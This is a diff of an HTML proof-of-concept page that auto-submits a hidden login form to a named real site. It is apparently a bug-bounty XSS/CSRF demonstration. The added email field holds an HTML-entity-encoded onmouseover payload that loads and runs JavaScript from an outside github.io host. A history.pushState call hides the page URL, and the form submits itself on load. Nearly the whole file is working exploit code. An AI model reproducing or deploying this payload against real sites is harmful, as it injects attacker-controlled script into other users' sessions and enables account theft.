@@ -1,15 +1,17 @@
 <html>
 <body>
 <h1>
-    This is a POC page to improve using window.opener is not safe.
+    POC for xss.Created by johnstone.
 </h1>
-<form action="https://analytics.romwe.com/ajax/" method="POST">
-  <input type="hidden" name="csrf_token" value="ac469163cae17bf3d604686e6d64260a" />
-  <input type="hidden" name="email" value="%22+oNmOuSeOvEr=prompt(1)//" />
-  <input type="hidden" name="password" value="vcgjauyj" />
-    <input type="hidden" name="ssoredirect" value="vcgjauyj" />
-   <input type="hidden" name="submitbutton" value="Login" /> 
-</form>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://analytics.romwe.com/ajax" method="POST">
+      <input type="hidden" name="email" value="&quot;&#32;onmouseover&#61;&#36;&#46;getScript&#40;&apos;https&#58;&#47;&#47;koffdsa&#46;github&#46;io&#47;burp1&#46;com&#47;js&#47;poc&#46;js&apos;&#41;&#47;&#47;" />
+      <input type="hidden" name="password" value="fdsafdsafdsa" />
+      <input type="hidden" name="submitbutton" value="Login" />
+      <input type="hidden" name="ssoredirect" value="" />
+      <input type="hidden" name="csrf&#95;token" value="d1604d3fd615d9cec4a3ab557028d252" />
+      <input type="submit" value="Submit request" />
+    </form>
 <script>
   document.forms[0].submit();
 </script>
